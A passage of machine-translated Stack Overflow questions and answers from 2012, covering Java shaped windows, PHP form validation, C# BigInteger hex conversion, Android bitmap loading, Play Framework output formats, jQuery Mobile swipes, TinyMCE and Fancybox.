    if (!gd.isWindowTranslucencySupported(WindowTranslucency.PERPIXEL_TRANSLUCENT)) {
        System.err.println("Shaped windows are not supported");
        System.exit(0);
    } else {
        new LongTab().setVisible(true);
    }
}
} 
```

请注意，我还使多边形变小了一些，因为我没有高清屏幕来适应您的原始多边形。

最后我删除了事件处理代码，因为我不明白你想用鼠标点击做什么。有了这个工作起点，您可以再次添加您的事件处理代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-23T19:25:04.967

好的，添加导入，并取出半透明验证。当我运行这个 Java6 代码时，红色轮廓显示 <1 秒，然后轮廓消失了！不知道为什么？

```
//LongTab.java
//Desktop Tab

import java.awt.BasicStroke;
import java.awt.Color;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
//import java.awt.GraphicsDevice.WindowTranslucency;
import java.awt.GraphicsEnvironment;
import java.awt.Polygon;
import java.awt.RenderingHints;
import java.awt.geom.GeneralPath;

import javax.swing.JFrame;
import com.sun.awt.AWTUtilities.*;

public class LongTab extends JFrame{

private Polygon polygon;

public LongTab() {
    setSize(500, 720);
    setLocation(10, 10);

    setUndecorated(true);

    polygon = new Polygon();
    polygon = new Polygon();
    polygon.addPoint(40, 720);
    polygon.addPoint(40, 700);
    polygon.addPoint(20, 690);
    polygon.addPoint(20, 400);
    polygon.addPoint(40, 390);
    polygon.addPoint(40, 20);
    polygon.addPoint(500, 20);
    polygon.addPoint(500, 720);

    GeneralPath path = new GeneralPath();
    path.append(polygon, true);
    com.sun.awt.AWTUtilities.setWindowShape(this, path);
}

public void paint(Graphics g) {
    super.paint(g);

    Graphics2D g2 = (Graphics2D) g;
    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
    g2.setStroke(new BasicStroke(2.0f));
    g2.setColor(Color.RED);
    g2.draw(polygon);
}

public static void main(String[] args) {
    //GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
    //GraphicsDevice gd = ge.getDefaultScreenDevice();

    // If shaped windows aren't supported, exit.
    //if (!gd.isWindowTranslucencySupported(WindowTranslucency.PERPIXEL_TRANSLUCENT)) {
    //    System.err.println("Shaped windows are not supported");
    //    System.exit(0);
    //} else {
        new LongTab().setVisible(true);
    //}
}
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-20T07:43:20.667

我设法弄清楚如何用 Java 6 解决这个问题。似乎只是简单地在我的绘画方法中取出抗锯齿线就可以解决图形渲染故障，其中轮廓不够干净。这是完整的工作代码......

问候奥布里。

```
 //LongTab.java
 //Desktop Tab

    import java.awt.*;
    import java.awt.event.*;
    import javax.swing.*;
    import java.awt.geom.*;
    import com.sun.awt.AWTUtilities.*;

    public class LongTab extends JWindow implements MouseListener{

    static LongTab t;
    Boolean isVisible = false;

    GeneralPath closed;

    final static BasicStroke stroke = new BasicStroke(2.0f);
    GeneralPath path;

    //Constructor
    public LongTab(){

        addMouseListener(this);
        setSize(500, 1080);

    addComponentListener(new ComponentAdapter() {
    @Override
    public void componentResized(ComponentEvent e){
    Polygon polygon = new Polygon();
    polygon = new Polygon();

    polygon.addPoint(40, 1080);
    polygon.addPoint(40, 700);

    polygon.addPoint(20, 690);
    polygon.addPoint(20, 400);
    polygon.addPoint(40, 390);

    polygon.addPoint(40, 0);
    polygon.addPoint(500, 0);
    polygon.addPoint(500, 1080);

    path = new GeneralPath();
    path.append(polygon, true);
    //setShape(path);
    com.sun.awt.AWTUtilities.setWindowShape(t, path);

    }});

    setSize(40, 1080);
    setLocation(1880, 0);

    }//end of constructor.

     public void mouseClicked (MouseEvent me) {

      if(!isVisible){
      isVisible=true;
      t.setSize(400, 1080);
      t.setLocation(1520, 0);

    return;
    }
      if(isVisible){
      isVisible=false;
      t.setSize(40, 1080);
      t.setLocation(1880, 0);
      }
      return;

    }
     public void mouseEntered (MouseEvent me) {}
     public void mousePressed (MouseEvent me) {}
     public void mouseReleased (MouseEvent me) {} 
     public void mouseExited (MouseEvent me) {}  

     public void paint(Graphics g) {
        Graphics2D g2 = (Graphics2D) g;

        //antialias commented out to fix outline glitch.
        //g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

    g2.setStroke(stroke);

    g2.drawLine(40, 1080, 40, 700);
    g2.drawLine(40, 700, 20, 690);
    g2.drawLine(20, 690, 20, 400);
    g2.drawLine(20, 400, 40,390);
    g2.drawLine(40, 390, 40, 0);

    }
    public static void main (String[] args){

                t = new LongTab();
                t.setVisible(true);
    }

} 
```

# php - 表单提交 当所有字段不为空时，我必须按两次提交

> ID：10676566
> 
> 赞同：0
> 
> 时间：2012-05-20T19:37:55.943
> 
> 标签：php, html, forms

我有这段代码，我在其中验证每个字段不为空，问题是当每个字段都被填写时，我必须按两次提交才能提交表单。

```
<table>
    <form method ="post" <?php 
    if(!empty($_POST['Firstname']) &&
       !empty($_POST['Lastname']) &&
       !empty($_POST['Email']) &&
       !empty($_POST['Comments'])){
       echo 'action="messagesent.php"';}
     else if(isset($_POST['Firstname']) ||
       isset($_POST['Lastname']) ||
       isset($_POST['Email']) ||
       isset($_POST['Comments'])) {
       echo 'action="contact.php"';}?> >
        <tr>
        <td><label>Firstname:</td><td><input name ="Firstname" type ="text" size ="30" <?php if(!empty($_POST['Firstname'])){$Firstname=$_POST['Firstname'];echo "value=$Firstname";} ?> /></td><td><?php if(empty($_POST['Firstname'])){echo "<font color='blue'>*</font>";}?></td>
        </tr>

        <tr>
        <td><label>Lastname:</td><td><input name="Lastname" type ="text" size ="30" <?php if(!empty($_POST['Lastname'])){$Lastname = $_POST['Lastname'];echo "value=$Lastname";}?> /></td><td><?php if(empty($_POST['Lastname'])){echo "<font color='blue'>*</font>";}?></td>
        </tr>

        <tr>
        <td><label>E-mail:</td><td><input name="Email" type ="text" size ="30" <?php if(!empty($_POST['Email'])){$Email = $_POST['Email'];echo "value=$Email";}?> /></td><td><?php if(empty($_POST['Email'])){echo "<font color='blue'>*</font>";}?> </td>
        </tr>

        <tr>
        <th colspan="2"><label>Your Message</th>
        </tr>
        <tr>
        <td colspan="2"><textarea name= "Comments" rows="10" cols="34"><?php $Comments=$_POST['Comments'];if(!empty($_POST['Comments'])){echo "$Comments";} ?> </textarea></td><td><?php if(empty($_POST['Comments'])){echo "<font color='blue'>*</font>";}?> </td>
        </tr>
        <tr>
        <td><input type="submit" value = "SUBMIT"/> </td>
        </tr>

    </form>
</table> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:43:27.057

看起来您希望 PHP 检查页面上的字段是否已填写。这不是 PHP 的工作方式。它在第一次渲染页面时评估一次，然后在页面再次加载之前不再执行任何操作。PHP 的`$_POST`数组不引用页面上的输入字段；它指的是页面在加载时从表单接收到的值。所以正在发生的事情是；

1.  页面第一次加载，`$_POST`因为没有提交表单，所以是空的。
2.  PHP 看到这一点并设置`ACTION`将您送回同一页面。
3.  您填写表格并点击提交。
4.  页面重新加载，但这次`$_POST`有值，因为您刚刚提交了表单。
5.  PHP 看到其中的值`$_POST`并设置`ACTION`为将您发送到下一页。
6.  您再次填写表格，点击提交，然后被发送到下一页。

如果要在提交表单之前检查表单是否填写了字段，则不能使用 PHP。你需要使用一些javascript。[这是一个快速教程](http://www.w3schools.com/js/js_form_validation.asp)，其中第一个示例解决了您要查找的内容。

# c# - 如何将十六进制值转换为大整数？

> ID：10676571
> 
> 赞同：0
> 
> 时间：2012-05-20T19:38:32.013
> 
> 标签：c#, biginteger

我的意思是如何将我的十六进制值转换为 biginteger ？

例如我用这个：

```
string value="A1";
BigInteger bi=new BigInteger(value,16); 
```

双 = 161; 这是真实的？那么如何将其转换回“A1”？

谢谢..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:42:53.840

`String.Format`支持这个：

```
String.Format("0:x", 161); 
```

工作示例：

```
 string value="A1";
        BigInteger bi = BigInteger.Parse(value, NumberStyles.HexNumber);
        string newVal = string.Format("{0:x}", bi);
        //newVal is a1 
```

更新：上述建议适用于.NET 命名空间中的`BigInteger`实现`System.Numerics`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:40:57.113

要将 BigInteger 转换回十六进制字符串，您可以这样做：

```
string value= bi.ToString("X"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-20T19:41:06.977

[`ToString`](http://msdn.microsoft.com/en-us/library/dd268341.aspx)被覆盖在`BigInteger`：

```
bi.ToString("X") 
```

# android - Android 基本编码尝试 Catch Show Toast 不起作用？

> ID：10676573
> 
> 赞同：0
> 
> 时间：2012-05-20T19:38:44.367
> 
> 标签：android, image, debugging, error-handling, try-catch

我正在构建一个真正简单的 Android 应用程序，但出现了很多问题。

我什至无法运行像样的 Try Catch Everything。而且由于我得到的机器功能严重不足，我直接在我的 android 设备上进行测试，但这并没有真正起作用。

即使使用通用的 try catch，应用程序在执行基本操作后似乎也会崩溃。我在这里做错了什么。

**为什么 try catch 没有捕捉到任何东西？**

这是我的 Main.xml（一个 textview 和另一个控件被剪掉了）

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    >

 <ImageButton
        android:id="@+id/ib"
        android:layout_width="300dip"
        android:layout_height="50dip"
        android:text="Hello World, MyActivity"
        android:scaleType="fitXY"
        android:onClick="onButtonClicked"
        /> 
```

这是我的简单代码（图像甚至没有显示）

```
public void onButtonClicked(View v) {
    try {
        String strFilePath = "/mnt/sdcard/somefile.jpg";
        if (strFilePath.length() > 0) {

            File file = new File(strFilePath);

            if (file.exists()) {
                ShowToast(strFilePath + "Bestaat");

                ImageButton image = (ImageButton) findViewById(R.id.ib);
                Bitmap bMap = BitmapFactory.decodeFile(strFilePath);
                image.setImageBitmap(bMap);

                ShowToast( "Done");
            } else {
                ShowToast(strFilePath + "Bestaat NIET");
            }
        } else {
            ShowToast(strFilePath + "strFilePath.length() =0");
        }

    } catch (Exception e) {
        HandleError(e);
    }
} 
```

**解决方案**

大小超过 3Mb 的文件。ImageButton 不会显示“大”的图片，并且什么也不做。该应用程序可能会抛出一些随机的内存不足异常，加载图像会导致整个应用程序崩溃。

阅读 logcat 足以调试这个“问题”

一些确实有效的代码（请从其他 SO 问题中借用）

```
 ImageButton image = (ImageButton) findViewById(R.id.ib);

    Bitmap bMap = BitmapFactory.decodeFile(strFilePath);
    Bitmap bSized = getResizedBitmap(bMap,150,150);
    image.setImageBitmap(bSized); 
```

和

```
 public Bitmap getResizedBitmap(Bitmap bm, int newHeight, int newWidth)                     
    {
      int width = bm.getWidth();
      int height = bm.getHeight();
      float scaleWidth = ((float) newWidth) / width;
      float scaleHeight = ((float) newHeight) / height;

      // create a matrix for the manipulation
      Matrix matrix = new Matrix();

      // resize the bit map
      matrix.postScale(scaleWidth, scaleHeight);

      // recreate the new Bitmap
      Bitmap resizedBitmap = Bitmap.createBitmap(bm, 0, 0, width, height, matrix, false);
      return resizedBitmap;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:14:11.427

要么您没有具有`ImageButton`该 ID 的图像，要么您尝试加载的图像太大以适应减少的应用程序内存。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:17:57.733

我已经测试了你的代码片段..

首先，ImageButton 不会显示 android:text 部分，因为该属性属于 Button..

仅使用 res/layout 文件夹中 main.xml 中的 LinearLayout 和 ImageButton 以及此代码，它可以正常工作：

```
public class Main extends Activity {
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
}

public void onButtonClicked(View v) {
    try {
        String strFilePath = "/mnt/sdcard/somefile.png";
        if (strFilePath.length() > 0) {

            File file = new File(strFilePath);

            if (file.exists()) {
                //ShowToast(strFilePath + "Bestaat");

                ImageButton image = (ImageButton) findViewById(R.id.ib);
                Bitmap bMap = BitmapFactory.decodeFile(strFilePath);
                image.setImageBitmap(bMap);

                //ShowToast( "Done");
            } else {
                //ShowToast(strFilePath + "Bestaat NIET");
            }
        } else {
            //ShowToast(strFilePath + "strFilePath.length() =0");
        }

    } catch (Exception e) {
        //HandleError(e);
        e.printStackTrace();
    }
}
} 
```

所以要么文件像 K-Ballo 建议的那样大，要么你的 ShowToast 或 HandleError 方法有问题。

# php - 一个网站的后端代码怎么会是C++，前端是PHP？

> ID：10676574
> 
> 赞同：0
> 
> 时间：2012-05-20T19:38:47.323
> 
> 标签：php, c++, apache, webserver

我问了一位 Facebook 工程师，他们使用什么主要的编程语言进行开发。他特别说“我们将 C++ 用于后端，PHP 用于前端”。这对我来说真的没有任何意义。我最初将其翻译为“服务器端”代码是 C++ 而“客户端”是 PHP，但是在研究了这个链接之后： http: [//tinsology.net/2009/06/client-side-vs-server-side -code/](http://tinsology.net/2009/06/client-side-vs-server-side-code/) 看起来 PHP 实际上是服务器端代码，而 HTML/CSS 是客户端。此外，C++ 通常不用于运行 Apache 或 IIS 的网络服务器。任何想法他的意思是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:40:48.843

C++*可*用于 CGI，但我认为您误解了。他们可能会将 PHP 用于网站，将 C++ 用于后台应用程序和/或 Web 服务。网站是业务的“前端”，所以 PHP 是后端还是前端，这取决于您的观点。PHP 确实是一种服务器端脚本语言，因此如果您是 Web 开发人员并且从 Web 开发人员的角度来看它，PHP 确实是后端。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:41:11.453

Facebook（几乎）使用 PHP 编写所有代码，但他们使用编译器将其转换为 C++ 代码。

这是因为这个世界上 PHP 程序员比 C++ 程序员多得多，但 C++ 更快、更高效。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-20T19:41:58.397

PHP 用于用户登录、跟踪帖子等，他们使用 C++ 处理数据库和 obv。后端。

C++ 并没有真正使用——你是对的。只是 C++ 速度更快，并且有数百万行代码，这里和那里的速度略有增加。由于它运行得更快，它的服务器负载也更轻，从而节省了金钱和电力。

我建议您查看一个名为“HIpHOP”的程序，它将 PHP 转换为 C++。它实际上是由 Facebook 工程师为 Facebook 本身编写的，我确信它已向公众发布。

# rest - 根据参数呈现输出格式（HTML、JSON、XML）？

> ID：10676577
> 
> 赞同：11
> 
> 时间：2012-05-20T19:38:56.107
> 
> 标签：rest, playframework-2.0

是否有根据参数在 Play Framework 中呈现输出的*好方法或正确方法？*例子：

**对于 HTML：**

```
http://localhost:9000/user/get/5?v=HTML // should render HTML template 
```

**对于 JSON：**

```
http://localhost:9000/user/get/5?v=JSON // should render JSON template 
```

我认为请求拦截器可以实现这一点，但我不知道如何开始或从哪里开始:-(

或者，也许，写一个`render method`根据要求读取参数和输出的将军，但这在我看来有点矫枉过正？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-21T13:04:56.023

如果`/user/5?v=html`和`/user/5?v=json`返回相同资源的两个表示，它们应该是相同的 URL，例如`/user/5`，根据[REST 原则](http://en.wikipedia.org/wiki/Representational_state_transfer#Guiding_principles_of_the_interface)。

在客户端，您可以使用`Accept`请求中的标头来指示您希望服务器向您发送哪种表示形式。

在服务器端，您可以使用 Play 2.1 编写以下代码来测试`Accept`标头的值：

```
public static Result user(Long id) {

  User user = User.find.byId(id);
  if (user == null) {
    return notFound();
  }

  if (request().accepts("text/html")) {
    return ok(views.html.user(user));
  } else if (request().accepts("application/json")) {
    return ok(Json.toJson(user));
  } else {
    return badRequest();
  }
} 
```

请注意，测试`"text/html"`应始终在任何其他内容类型之前编写，因为浏览器将`Accept`其请求的标头设置为`*/*`匹配所有类型。

如果您不想`if (request().accepts(…))`在每个操作中编写，您可以将其分解出来，例如如下：

```
public static Result user(Long id) {
  User user = User.find.byId(id);
  return representation(user, views.html.user.ref);
}

public static Result users() {
  List<User> users = User.find.all();
  return representation(users, views.html.users.ref);
}

private <T> Result representation(T resource, Template1<T, Html> html) {
  if (resource == null) {
    return notFound();
  }

  if (request().accepts("text/html")) {
    return ok(html.apply(resource));
  } else if (request().accepts("application/json")) {
    return ok(Json.toJson(resource));
  } else {
    return badRequest();
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:26:59.390

编写 2 个方法，使用 2 个路由（如您未指定，我将使用 Java 示例：

```
public static Result userAsHtml(Long id) {
    return ok(someView.render(User.find.byId(id)));
}

public  static Result userAsJson(Long id) {
    return play.libs.Json.toJson(User.find.byId(id));
} 
```

路线：

```
/GET    /user/get/:id/html     controllers.YourController.userAsHtml(id:Long)
/GET    /user/get/:id/json     controllers.YourController.userAsJson(id:Long) 
```

接下来你可以在其他视图中创建一个链接来显示用户的数据

```
<a href="@routes.YourController.userAsHtml(user.id)">Show details</a>
<a href="@routes.YourController.userAsJson(user.id)">Get JSON</a> 
```

或者是其他东西...

**编辑#1**

您还可以使用 common`if`或`case`来确定最终输出

```
public static Result userAsV() {
    String vType = form().bindFromRequest().get("v");

    if (vTtype.equals("HTML")){
        return ok(someView.render(User.find.byId(id)));
    }

    return play.libs.Json.toJson(User.find.byId(id));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-10T06:17:59.533

我希望用户能够在浏览器中以 html 或 json 的形式查看，因此接受方法对我不起作用。

我通过将通用 renderMethod 放在具有以下样式语法的基类中来解决它

```
public static Result requestType( )
{
    if( request().uri().indexOf("json") != -1)
    {
        return ok(Json.toJson(request()));
    }
    else 
    {
        return ok("Got HTML request " + request() );
    }
} 
```

# iphone - UIControl - addTarget: action: forControlEvents 不调用选择器内的方法

> ID：10676581
> 
> 赞同：0
> 
> 时间：2012-05-20T19:39:51.050
> 
> 标签：iphone, uicontrol, target-action

我在向我的应用程序添加目标/操作方法时遇到问题。这是我的代码：

```
-(void)printInConsole
{
  NSLog(@"2");
}

-(void)createGCButton
{
  UIButton * LButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
  LButton.frame = CGRectMake(200, 90, 100, 50);
  [LButton setTitle:@"L" forState:UIControlStateNormal];
  [self.view addSubview:LButton];
  [LButton addTarget:self action:@selector(printInConsole)forControlEvents:UIControlEventTouchUpInside];
} 
```

所以首先我尝试了一种游戏中心方法，但我没有工作。现在我添加了这个简单的 NSLog 方法，它也不起作用。控制台什么也不写。那么问题出在哪里。如果您需要有关我的代码的更多详细信息，请说出来，我会发布它。上帝保佑解决这个问题的人。

问候，克莱门

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:42:26.340

问题很可能与`UITapGestureRecognizer`. 你可以看到我就这个问题[发表的这篇博](http://www.sore.nu/blog/2012/apr/16/uitapgesturerecognizer-and-uibutton/)文。

基本上你需要实现一个`UITapGestureRecognizer`委托方法并告诉它不要弄乱按钮。

```
- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch
{
    return ![touch.view isKindOfClass:[UIButton class]];
} 
```

# jquery-mobile - 使用 .on() 在 jQM 中针对滑动事件定位否定选择器

> ID：10676585
> 
> 赞同：1
> 
> 时间：2012-05-20T19:40:35.177
> 
> 标签：jquery-mobile, jquery-mobile, jquery-selectors, event-handling, jquery

**背景：**

我正在为[jquery-mobile](/questions/tagged/jquery-mobile "显示标记为“jquery-mobile”的问题")中的滑动事件开发一个导航类。该类从 JSON 结构中读取树状站点地图，并分配`swipeleft`事件`swiperight`以浏览树中的顶级节点。它将事件处理程序分配给每个节点的子节点，并将处理`swipedown`程序分配给这些子节点的兄弟姐妹，等等无限级别。我只是将这些处理程序附加到当前加载的页面，由标识，并且我正在使用函数来确保这些处理程序永远不会被绑定两次。该类在挂钩期间读取 pageMap 结构。`swipeup``swipeleft``swiperight``$.mobile.activePage``$(document).one()``$(document).bind('pagebeforeshow')`

下面是一些*草稿*示例代码，用于在树的单个级别中处理 swipeleft 和 swiperight：

```
/** @todo 
 *  tidy up the next 2 conditionals into a single function and a mapping object
 *  that can handle left, right, up and down
 */
//if this isn't the first page
if(page.prev !== undefined) {
    //attach the swipe handler to the previous page
    Utils.logger('log', 'Binding a swiperight to ' + page.id);
    $(page.id).one('swiperight', 'div.content', function(event) {
        Utils.logger('log', 'Navigating to previous slide: ' + page.prev.url); //debug
        $.mobile.changePage(            
            page.prev.url, {
                transition: 'slide',
                direction: 'reverse'
            }
        );
    });
    //debugging
    Utils.logger('log', 'Route: ' + page.prev.url + ' <== ' + page.url);
}

//if this isn't the last page
if(page.next !== undefined) {
    //attach the swipe handler to the previous page
    Utils.logger('log', 'Binding a swiperight to ' + page.id);
    $(page.id).one('swipeleft', 'div.content', function(event) {
        Utils.logger('log', 'Navigating to next slide: ' + page.next.url); //debug
        $.mobile.changePage(            
            page.next.url, {
                transition: 'slide'
            }
        );
    });
    //debugging
    Utils.logger('log', 'Route: ' + page.url + ' ==> ' + page.next.url);
} 
```

*如果您想知道，`Utils.logger`这只是一个简单的包装类`console`*

**问题：**

我的问题是这棵树中的页面可以包含许多不同类型的元素。有些很简单，看起来很像照片库幻灯片。我对这类页面没有任何问题。其他页面包含表单和嵌套幻灯片。因此，我的页面中可能有一个 DIV，它处理滑动事件以在幻灯片中创建幻灯片 - 现在让我们忽略它并专注于更琐碎的事情：我的表单中有滑块控件之类的东西。在触摸屏上滑动滑块相当于在触摸屏上滑动……我想你知道这是怎么回事……！**如果我在表单中滑动滑块，我会触发一个滑动事件，该事件会更改我导航系统中的页面**...... DOH！

**如何确保我的页面导航滑动只针对我的 div.content，而忽略上述所有内容？**我试过使用 .on() 的选择器参数，但我认为我正在寻找的是一种否定/不是那些选择器的方法？

这是我的标记示例（对于此示例，它被简化为基本要素 - 但请想象一个具有多个字段集的大型表单）：

```
<div data-role="page" id="feedback" class="page">
    <div data-role="content" id="feedback-form" class="content">
        <form action="#" method="get">
            <div data-role="fieldcontain">
                <label for="more-info">Would you like more info?</label>
                <select name="slider2" id="more-info" data-role="slider">
                    <option value="off">No</option>
                    <option value="on">Yes</option>
                </select>
            </div>
            <div data-role="fieldcontain">
                <label for="slider">Please rate this presentation out of 10:</label>
                <input type="range" name="slider" id="slider" value="5" min="0" max="10" data-highlight="true"  />
            </div>
            <div class="ui-body ui-body-b">
                <fieldset class="ui-grid-a">
                        <div class="ui-block-a"><button type="reset" id="reset" data-theme="d" data-icon="delete" data-iconpos="left">Cancel</button></div>
                        <div class="ui-block-b"><button type="submit" data-theme="b" data-icon="check" data-iconpos="right" >Submit</button></div>
                </fieldset>
            </div>
        </form>
    </div>
</div> 
```

**因此，澄清和总结：** 我正在寻找一种以`div.content`滑动事件为目标的方法，但***忽略***发生在`<form>`（不是`<form>`本身）的子节点上的任何滑动事件以及具有它们的 div 集合上的任何滑动事件自己的滑动事件 - 我可以轻松添加所有这些添加一个类来喜欢：`.ignorePageSwipe`。哦，当然它不应该是性能猪！！！

# javascript - tinymce 在切换内部不起作用

> ID：10676586
> 
> 赞同：1
> 
> 时间：2012-05-20T19:40:41.450
> 
> 标签：javascript, jquery, html, tinymce, toggle

我无法弄清楚为什么 tinyMCE 不会在切换块上执行。

Javascript：

```
$(document).ready(function(){

    // Turn ON tinyMCE for every .tiny_editor
    tinyMCE.init({  
        language : 'es',
        mode: 'textareas',
        editor_selector : "tiny_editor",
        theme: 'advanced',

        theme_advanced_toolbar_align: 'left',
        theme_advanced_toolbar_location: 'top',
        theme_advanced_statusbar_location: 'bottom',

        plugins: 'table,advhr,advlink,preview,advimage,media,searchreplace,print,fullscreen',

        theme_advanced_buttons1: 'bold,italic,underline,strikethrough,|,justifyleft,justifycenter,justifyright,justifyfull,|,bullist,numlist,outdent,indent,|,fontselect,fontsizeselect,forecolor,backcolor',
        theme_advanced_buttons2: 'cut,copy,paste,pastetext,pasteword,|,search,replace,|,undo,redo,|,link,unlink,anchor,advhr,|,sub,sup,|,charmap,image,media,|,cleanup,removeformat,code,fullscreen',
        theme_advanced_buttons3: 'tablecontrols,|,preview,print,|,help',

        extended_valid_elements: 'iframe[align<bottom?left?middle?right?top|class|frameborder|height|id|longdesc|marginheight|marginwidth|name|scrolling<auto?no?yes|src|style|title|width]'
    });

        // Clear checkbox
    $('.entradilla_check').attr('checked', false);
        // On checkbox value change (set or not), toggle .entradilla_box
    $('.entradilla_check').change(function(){
        $('.entradilla_box').toggle('slow');
    });

}); 
```

HTML：

```
<textarea style="width: 100%; height: 200px; display: none;" name="entradilla" class="tiny_editor entradilla_box">
    <?=$news_row['abstract'];?>
</textarea> 
```

切换有效，但是当 textarea 显示时...它显示时没有 tinymce

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T02:48:56.917

这是我能做的最好的。我使用[了 tinymce.hide](http://tinymce.moxiecode.com/js/tinymce/docs/api/index.html#class_tinymce.Editor.html-hide)和[tinymce.show](http://tinymce.moxiecode.com/js/tinymce/docs/api/index.html#class_tinymce.Editor.html-show)。

> **显示**
> 
> 隐藏编辑器并显示编辑器应该替换的任何 textarea/div。
> 
> **隐藏**
> 
> 显示编辑器并隐藏编辑器应该替换的任何 textarea/div。

```
var tinymcevisible = true;
$('#show').click(function() {
    if (tinymcevisible) {
        tinyMCE.get('second').hide();
        $('#second').hide();
        tinymcevisible = false;
    } else {
        tinyMCE.get('second').show();
        tinymcevisible = true;
    }
}); 
```

**[演示](http://jsfiddle.net/dhirajbodicherla/cmFms/2/)**

希望这可以帮助

# jquery - Fancybox 画廊组

> ID：10676588
> 
> 赞同：8
> 
> 时间：2012-05-20T19:40:43.487
> 
> 标签：jquery, fancybox

我正在使用 fancybox [http://fancyapps.com/fancybox/](http://fancyapps.com/fancybox/)，我的问题是：

我可以将不同的资源组合在一起吗？我的意思是在同一个画廊（或“组”）中带有内联或视频的图像。如果是的话，有人知道怎么做吗？

这是一个不起作用的示例：

```
<a class="fancyinline" data-fancybox-group="testgroup" href="#cont3">Test</a>
<div class="fancyhidden" id="cont3">Test Content</div>
<a class="fancyimage" data-fancybox-group="testgroup" href="test.jpg" >
    <img src="test-th.jpg" alt="" />
</a> 
```

fancyinline 和 fancyimage 没有组合在一起，但我需要这样。当然，我需要内联和图像的不同参数......

先感谢您。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-20T19:58:06.120

要在fancybox 中对导航元素进行分组，您需要`rel`在每个元素上设置属性。相同的`rel`值会告诉fancybox，如果打开的话，所有这些都将出现在导航中。

看到这个[工作小提琴！](http://jsfiddle.net/zuul/wm8QD/)

# 组示例

**HTML**

```
<a rel="example_group" title="Custom title" href="full_path_to_image.jpg">
  <img alt="" src="path_to_image_thumbs.jpg">
</a>
<a rel="example_group" title="Custom title" href="full_path_to_image.jpg">
  <img alt="" src="path_to_image_thumbs.jpg">
</a> 
```

**查询**

```
$("a[rel=example_group]").fancybox(); 
```

* * *

# 组示例一可见，其余隐藏

**HTML**

```
<a rel="group2" title="Custom title" href="full_path_to_image.jpg">
  <img alt="" src="path_to_image_thumbs.jpg">
</a>
<a rel="group2" title="" href="full_path_to_img.jpg" style="display:none;"></a>
<a rel="group2" title="" href="full_path_to_img.jpg" style="display:none;"></a>
<a rel="group2" title="" href="full_path_to_img.jpg" style="display:none;"></a> 
```

**查询**

```
$("a[rel=group2]").fancybox(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-06T05:48:43.007

我这样做

```
$("#fancybox-manual-c").click(function() {
            $.fancybox.open([
                {
                    href : '1_b.jpg',
                    title : 'My title'
                }, {
                    href : '2_b.jpg',
                    title : '2nd title'
                }, {
                    href : '3_b.jpg'
                }
            ], {
                helpers : {
                    thumbs : {
                        width: 75,
                        height: 50
                    }
                }
            });
        }); 
```

# json - Freebase：使用“命名空间前缀键”Json 对象

> ID：10676594
> 
> 赞同：2
> 
> 时间：2012-05-20T19:41:08.600
> 
> 标签：json, freebase

我已经向 freebase API 发出请求，查询是：

```
{
  "id" : "/m/01f8mn",
  "key" : [{
    "namespace" : "/wikipedia/en_id",
    "value" : null
  }],
  "key" : [{
    "namespace" : "/authority/mobygames/game",
    "value" : null
  }]  
}​ 
```

我从 Freebase 得到了答案：

```
{
  "code":          "/api/status/ok",
  "result": {
    "id": "/m/01f8mn",
    "key": [{
      "namespace": "/wikipedia/en_id",
      "value":     "213502"
    }],
    "ns0:key": [{
      "namespace": "/authority/mobygames/game",
      "value":     "prince-of-persia"
    }],
    "ns1:key": [{
      "namespace": "/authority/giantbomb/game",
      "value":     "61-2561"
    }]
  },
  "status":        "200 OK",
  "transaction_id": "cache;cache03.p01.sjc1:8101;2012-05-20T18:37:04Z;0060"
} 
```

如您所见，结果中有一个“命名空间前缀”键（“ns0:key”、“ns1:key”）

问题是：如何使用 Javascript 对象处理这个问题？任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:45:35.463

访问名称中带有特殊字符的属性时，请像访问关联数组属性一样访问它：

```
yourObject.result["ns0:key"] 
```

由于命名空间和值属性存储在作为数组第一个索引的对象内部，因此要访问命名空间和值，请使用以下语法：

```
yourObject.result["ns0:key"][0].namespace
yourObject.result["ns0:key"][0].value       // contains "prince-of-persia"

yourObject.result["ns1:key"][0].namespace
yourObject.result["ns1:key"][0].value       // contains "61-2561" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T04:01:46.460

您的初始查询不是有效的 JSON（两个“关键”键将相互覆盖），所以我怀疑涉及到一个中间软件层（也许是 Freebase 的查询编辑器？）。

